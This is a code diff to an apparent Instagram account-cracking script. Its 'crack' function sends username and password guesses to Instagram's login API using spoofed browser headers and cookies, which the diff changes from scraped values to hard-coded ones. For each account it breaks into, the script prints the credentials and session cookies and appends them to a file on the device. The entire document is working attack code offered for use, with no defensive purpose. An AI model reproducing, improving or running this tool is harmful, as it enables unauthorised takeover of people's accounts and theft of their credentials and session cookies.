@@ -125,13 +125,12 @@ def crack(uid, pww, total_idz):
             session = requests.Session()
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            free_fb = session.get(f'https://www.instagram.com').text
             cookies = {
-                'csrftoken': re.search('name="csrftoken" value="(.*?)"', str(free_fb)).group(1),
-                'mid': re.search('name="mid" value="(.*?)"', str(free_fb)).group(1),
-                'ig_did': re.search('name="ig_did" value="(.*?)"', str(free_fb)).group(1),
+                'csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
+                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
+                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
                 'ig_nrcb': '1',
-                'datr': re.search('name="datr" value="(.*?)"', str(free_fb)).group(1),
+                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
                 'ps_l': '1',
                 'ps_n': '1',
                 'wd': '885x773',}
@@ -143,27 +142,28 @@ def crack(uid, pww, total_idz):
                 'username': uid,}
             headers = {
                 'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
                 'content-type': 'application/x-www-form-urlencoded',
-                # 'cookie': 'csrftoken=0AS3u6XVn8bWH_jeWMQw4c; dpr=2.200000047683716; mid=ZsGH-gABAAHTlZHGc8pSZb05vOmE; datr=-ofBZsbspK-aBMjxtFXGrrZj; ig_did=4FCC0FDE-E73F-4507-BCBE-6F26A25A7DF9; wd=491x571',
+                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
                 'origin': 'https://www.instagram.com',
-                'referer': 'https://www.instagram.com/',
-                'sec-ch-prefers-color-scheme': 'light',
-                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-                'sec-ch-ua-model': '"23076PC4BI"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-platform-version': '"14.0.0"',
+                'priority': 'u=1, i',
+                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform-version': '"10.0.0"',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                 'x-asbd-id': '129477',
-                'x-csrftoken': re.search('name="csrftoken" value="(.*?)"', str(free_fb)).group(1),
+                'x-csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
                 'x-ig-app-id': '936619743392459',
                 'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015767958',
+                'x-instagram-ajax': '1015781171',
                 'x-requested-with': 'XMLHttpRequest',}
             login_url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
@@ -174,21 +174,21 @@ def crack(uid, pww, total_idz):
                    if json_response.get('authenticated') == True:
                         cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {session_cookies}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
                    elif json_response.get('auth_token'):
                         cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {session_cookies}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
                    elif 'sessionid' in session_cookies:
                         cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {session_cookies}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
